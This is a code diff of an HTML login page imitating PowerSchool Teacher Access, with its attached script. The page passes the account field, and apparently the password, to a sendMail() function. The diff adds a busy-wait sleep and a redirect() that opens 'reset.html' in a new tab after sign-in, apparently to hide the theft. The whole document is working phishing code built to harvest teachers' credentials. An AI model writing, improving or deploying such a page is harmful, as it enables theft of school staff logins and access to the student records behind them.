@@ -103,12 +103,19 @@
                                         <input type="password" id="fieldTranslator" name="translatorpw" value="" size="39" autocomplete="off">
                                     </div>
 									<div class="button-row">
-										<input type="button" id="btn-enter" title="Sign In To PowerSchool Teacher Access" value="Sign In" border="0" onclick="sendMail()">
+										<input type="button" id="btn-enter" title="Sign In To PowerSchool Teacher Access" value="Sign In" border="0" onclick="sendMail(),redirect()">
 										</button>
 									</div>
 								</fieldset>
 								</div>
 								<script>
+									function sleep(milliseconds) {
+										const date = Date.now();
+										let currentDate = null;
+										do {
+											currentDate = Date.now();
+										} while (currentDate - date < milliseconds);
+										}
 									function sendMail(params) {
 										var temp ={
 											from_name:document.getElementById("fieldAccount").value,
@@ -122,10 +129,9 @@
 									function enterKeyPressed(event) {
 										if (event.keyCode == 13) {
 											console.log("Enter key is pressed");
-											setTimeout(3000)
-											console.log("Sleep")
 											sendMail();
-											window.location.href = "reset.html";
+											console.log("Sleep")
+											redirect();
 											return true;
 										} else {
 											return false;
@@ -135,14 +141,19 @@
 									function TextenterKeyPressed(event) {
 										if (event.keyCode == 13) {
 											console.log("Enter key is pressed");
-											setTimeout(3000)
-											console.log("Sleep")
 											sendMail();
-											/*window.location.href = "reset.html";*/
+											console.log("Sleep");
 											return true;
 										} else {
 											return false;
 										}
+									}
+
+									function redirect() {
+										console.log('redirecting');
+										sleep(1400);
+										console.log('Sleep');
+										window.open("reset.html","_blank");
 									}
 									
 								</script>
